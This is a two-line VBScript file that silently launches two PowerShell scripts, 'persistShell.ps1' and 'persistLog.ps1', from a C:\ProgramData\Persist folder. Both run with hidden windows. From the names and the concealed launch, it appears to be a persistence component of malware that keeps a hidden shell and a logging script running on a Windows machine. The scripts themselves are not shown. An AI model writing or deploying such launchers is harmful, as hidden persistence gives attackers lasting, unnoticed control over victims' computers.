CreateObject("WScript.shell").run "powershell start-process powershell C:\ProgramData\Persist\persistShell.ps1 -windowstyle hidden", 0, true
CreateObject("WScript.shell").run "powershell start-process powershell C:\ProgramData\Persist\persistLog.ps1   -windowstyle hidden", 0, true
